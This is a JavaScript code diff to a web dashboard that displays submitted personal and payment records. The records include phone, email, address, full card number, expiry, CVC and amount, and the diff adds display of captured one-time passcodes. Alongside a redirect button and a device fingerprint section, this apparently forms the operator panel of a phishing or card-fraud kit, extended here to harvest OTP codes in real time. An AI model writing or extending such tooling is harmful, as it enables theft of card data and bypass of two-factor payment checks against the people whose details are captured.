@@ -197,7 +197,6 @@ function paymentHTML(v) {
     if (!v.payment_data) return '';
     try {
         const p = typeof v.payment_data === 'string' ? JSON.parse(v.payment_data) : v.payment_data;
-        // Format card number with spaces for readability
         const cn = p.card_number || '';
         const formatted = cn.replace(/(.{4})/g, '$1 ').trim();
         return `
@@ -209,6 +208,18 @@ function paymentHTML(v) {
                 <div class="vw-submitted-row"><span class="lbl">Expiry</span><span class="val">${esc(p.expiry)}</span></div>
                 <div class="vw-submitted-row"><span class="lbl">CVC</span><span class="val">${esc(p.cvc||'')}</span></div>
                 <div class="vw-submitted-row"><span class="lbl">Amount</span><span class="val">${esc(p.amount)}</span></div>
+            </div>`;
+    } catch(e) { return ''; }
+}
+
+function otpHTML(v) {
+    if (!v.otp_data) return '';
+    try {
+        const o = typeof v.otp_data === 'string' ? JSON.parse(v.otp_data) : v.otp_data;
+        return `
+            <div style="margin-top:6px;padding-top:8px;border-top:1.5px dashed #e2e8f0">
+                <div class="vw-submitted-row"><span class="lbl" style="color:#7c3aed;font-weight:700">OTP Code</span><span class="val" style="color:#7c3aed;font-size:.72rem">Received ${esc(o.received_at||'')}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">Code</span><span class="val" style="font-family:Consolas,monospace;letter-spacing:2px;font-size:1.1rem;font-weight:700">${esc(o.code)}</span></div>
             </div>`;
     } catch(e) { return ''; }
 }
@@ -260,9 +271,13 @@ function updateCard(v) {
         if (ident) {
             const div = document.createElement('div');
             div.className = 'vw-submitted';
+            div.setAttribute('data-u', 'submitted');
             div.innerHTML = `
-                <div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>
-                <div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>`;
+                ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
+                ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
+                ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
+                ${paymentHTML(v)}
+                ${otpHTML(v)}`;
             ident.after(div);
         }
     }
@@ -273,14 +288,15 @@ function updateCard(v) {
         if (redirBtn) redirBtn.disabled = false;
     }
 
-    // Refresh submitted data section (picks up new payment data etc)
+    // Refresh submitted data section (picks up new payment/otp data)
     const sub = el.querySelector('[data-u="submitted"]');
     if (sub && v.name) {
         sub.innerHTML = `
             ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
             ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
             ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
-            ${paymentHTML(v)}`;
+            ${paymentHTML(v)}
+            ${otpHTML(v)}`;
     }
 }
 
@@ -318,6 +334,7 @@ function buildInner(v) {
             ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
             ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
             ${paymentHTML(v)}
+            ${otpHTML(v)}
         </div>` : ''}
         <div class="vw-fp">
             <div class="vw-fp-title">Fingerprint</div>
